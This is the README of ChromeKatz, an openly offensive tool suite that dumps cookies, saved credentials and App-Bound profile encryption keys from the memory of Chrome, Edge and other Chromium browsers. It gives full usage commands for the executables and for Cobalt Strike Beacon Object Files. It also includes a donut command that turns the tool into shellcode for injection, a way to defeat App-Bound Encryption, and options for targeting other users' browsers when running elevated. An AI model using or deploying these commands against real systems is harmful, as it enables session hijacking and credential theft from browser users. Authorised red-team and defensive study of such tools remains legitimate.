# ChromeKatz

ChromeKatz is a solution for dumping sensitive information from memory of Chromium based browsers.
As for now, ChromeKatz consists of three projects:
 1. CookieKatz - The cookie dumper
 2. ~~CredentialKatz~~ - Deprecated.. for now
 3. ElevationKatz - Get the decryption key from the elevation service

CookieKatz has an exe, Beacon Object File, and minidump parser available. And for the ElevationKatz executable and Beacon Object File.

ElevationKatz is now capable of parsing the cookie and credentials databases from the browser memory and decrypting them for you. 

CookieKatz has been completely revamped to use much more robust method for finding the cookies! New method supports older browser version as well.
There is now new flag /inject implemented to CookieKatz to defeat the App-Bound Encryption on relevant browsers!

I need a coffee, and my cats need too!

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/E1E716M78J)

## CookieKatz - Dump cookies directly from memory

CookieKatz is a project that allows operators to dump cookies from Chrome, Edge or Msedgewebview2 directly from the process memory.
Chromium based browsers load all their cookies from the on-disk cookie database on startup. 

The benefits of this approach are*:
 1. Support dumping cookies from Chrome's Incogntio and Edge's In-Private processes
 1. Access cookies of other user's browsers when running elevated
 1. Dump cookies from webview processes
 1. No need to touch on-disk database file
 1. DPAPI keys not needed to decrypt the cookies
 1. Parse cookies offline from a minidump file

These statements are still true on some browsers/applications. For latest versions of Chrome you will need to inject into the process.
    ... Our use the ElevationKatz

32bit browser installations are not supported and 32bit builds of CookieKatz are not supported either.

Currently only regular cookies are dumped. Chromium stores [Partitioned Cookies](https://developers.google.com/privacy-sandbox/3pcd/chips) in a different place and they are currently not included in the dump.

This solution consists of three projects, **CookieKatz** that is a PE executable, **CookieKatz-BOF** that is a Beacon Object File version and **CookieKatzMinidump** which is the minidump parser.

## Usage

NOTE! When choosing using PID to target, use commands /list or cookie-katz-find respectively to choose the right subprocess!

### CookieKatz

```text
Examples:
.\CookieKatz.exe
    By default targets first available Chrome process
.\CookieKatz.exe /edge
    Targets first available Edge process
.\CookieKatz.exe /pid:<pid>
    Attempts to target given pid, expecting it to be Chrome
.\CookieKatz.exe /webview /pid:<pid>
    Targets the given msedgewebview2 process
.\CookieKatz.exe /list /webview
    Lists available webview processes
.\CookieKatz.exe /inject
    Targets the current process. Use this flag when your are injecting CookieKatz to Chrome process.

TIP! If you need to inject CookieKatz into the Chrome process, you can turn the exe into shellcode using donut:
    .\donut.exe -a 2 --input <Path_to_CookieKatz.exe> -z 4 -b 1 -p "/inject" -t

Flags:
    /edge       Target current user Edge process
    /webview    Target current user Msedgewebview2 process
    /pid        Attempt to dump given pid, for example, someone else's if running elevated
    /list       List targettable processes, use with /edge or /webview to target other browsers
    /inject     Indicate that the process will run in the target process
    /out        Write output to file, default location is "C:\Users\Public\Documents\cookies.log"
    /help       This what you just did! -h works as well
```

### CookieKatz-BOF

```text
beacon> help cookie-katz
Dump cookies from Chrome or Edge
Use: cookie-katz [chrome|edge|webview] [pid]

beacon> help cookie-katz-find
Find processes for Cookie-Katz
Use: cookie-katz-find [chrome|edge|webview]
```

### CookieKatzMinidump

```text
Usage:
    CookieKatzMinidump.exe <Path_to_minidump_file>

Example:
    .\CookieKatzMinidump.exe .\msedge.DMP

To target correct process for creating the minidump, you can use the following PowerShell command:
    Get-WmiObject Win32_Process | where {$_.CommandLine -match 'network.mojom.NetworkService'} | select -Property Name,ProcessId
```

## ElevationKatz - Dump profile database key from memory

ElevationKatz lets operators to dump browser profile encryption key from memory to allow access for user's sensitive information.
This works by starting a new browser process suspended, setting up break points and dumping the key once the browser process receives it from the elevator service.

The benefits of this approach are:
 1. No admin access required
 1. No need to inject into other processes
 1. No writing files on disk
 1. No need to touch the on-disk profile databases

ElevationKatz will start a new browser process in suspended state and attach a debugger to it. Then it will scan the browser dll to find the instruction where the browser returns from call to **os_crypt::DecryptAppBoundString** and setting a breakpoint immediately after. Once the breakpoint is hit, the tool will dump the encryption key from the memory.

There are two breakpoint types which the operator may choose from: Software and Hardware breakpoints.
* Software breakpoint works by patching the instruction in the memory and overwriting the old one. This obviously has the downside of using WIN API WriteProcessMemory.
* Hardware breakpoints are set into registers of the executing thread directly. This avoids the use of WriteProcessMemory, but will require heavy use of pattern: OpenThread->SuspendThread->ResumeThread.

Additionally for HW breakpoints, there are two supported ways for thread enumeration to choose from: NtGetNextThread and CreateToolhelp32Snapshot. SW breakpoints do not need thread enumeration and therefore the /tl32 flag does not affect it.

New **config** parameter may be used to automatically decrypt the profile databases. This utilises [IHack4Falafel's](https://github.com/ihack4falafel) technique to parse the **Cookie** and **Login Profile** databases from the browser memory, avoiding touching the files directly.

**Note** dumping only works with the HW Breakpoints as I couldn't figure out how to properly cleanup the SW Breakpoints and rewind RIP to avoid the process crashing. 

### ElevationKatz

```text
Examples:
.\ElevationKatz.exe /chrome
    Starts a new chrome process using path: C:\Program Files\Google\Chrome\Application\chrome.exe
    Waits for 500 milliseconds for process to finish until forced shutdown.
.\ElevationKatz.exe /chrome /hw
    Starts a new chrome process using path: C:\Program Files\Google\Chrome\Application\chrome.exe
    Will use Hardware breakpoints instead of the software ones
    Waits for 500 milliseconds for process to finish until forced shutdown.
.\ElevationKatz.exe /chrome /config:all\n");
    Starts a new chrome process using path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe
    Will use Hardware breakpoints instead of the software ones
    Parses the cookie and credential database from the browser memory and dumps them
.\ElevationKatz.exe /edge /wait:1000
    Starts a new chrome process using path: C:\Program Files(x86)\Microsoft\Edge\Application\msedge.exe
    Waits for 1000 milliseconds for process to finish until forced shutdown.
.\ElevationKatz.exe /path:\"C:\Program Files\BraveSoftware\Brave - Browser\Application\brave.exe\" /module:chrome.dll
    Targets the Brave browser
    
Flags:
    /chrome                Target Chrome process.
    /edge                  Target Edge process.
    /hw                    Use Hardware breakpoints instead of SW ones.
    /tl32                  Use CreateToolhelp32Snapshot to enumerate process threads when using with /HW flag
    /wait:<milliseconds>   Maximum time to for the debugging. Use 0 for INFINITE. Defaults to 500ms.
    /path:<path_to_exe>    Provide path to the process executable
    /module:<some.dll>     Provide alternative module to target
    /config:<option>       Automatically locate and dump contents of profile databases. Options. Cookies|Creds|All
    /help                  This what you just did! -h works as well
```

### ElevationKatz-BOF

```text
beacon> help elevation-katz
Dump elevation service encryption key

Use: elevation-katz [chrome|edge] [useHW] [useTL32] [wait:<ms>] [terminate] [executable:<path>] [module:<path>]
```

## CredentialKatz - Dump credential manager contents from memory

### Deprecated

I made a report for Chromium project about the bug that the CredentialKatz was originally exploiting and they marked it as "Won't fix" and said that they don't care if the credentials linger in the memory.

Suddenly they did fix the bug in the exact way I proposed after the tool got published :3
https://issues.chromium.org/issues/352085708


# Build and Install

## Use precompiled binaries
Download the latest release build of the ChrokeKatz BOFs [here](https://github.com/Meckazin/ChromeKatz/releases/latest). The zip file includes compiled BOFs and the CNA script to run them.

## Build your own
You may build both projects on Visual Studio with Release or Debug configuration and x64 platform. 

BOF version has been developed with Cobalt Strike's Visual Studio template [bof-vs](https://github.com/Cobalt-Strike/bof-vs). This means that Debug configuration for the *-BOFs will generate an exe instead of the COFF file. You can read more about the use of the Visual Studio template [here](https://www.cobaltstrike.com/blog/simplifying-bof-development).

You can compile your own BOF with nmake in **x64 Native Tools Command Prompt for VS 2022**:
```text
nmake all
```

## Credits
- [Henkru](https://github.com/Henkru) for fixing the BOF version crashes and creating the CNA script
- [IHack4Falafel](https://github.com/ihack4falafel) for the cool trick to parse the profile DBs from the browser memory
- [B3arr0](https://github.com/B3arr0) for testing the BOF version and helping to squash the bugs
- [TheWover](https://github.com/TheWover) for excellent PEB definitions!
- [0vercl0k](https://github.com/0vercl0k) for creating udmp-parser which is the core library for minidump parsing
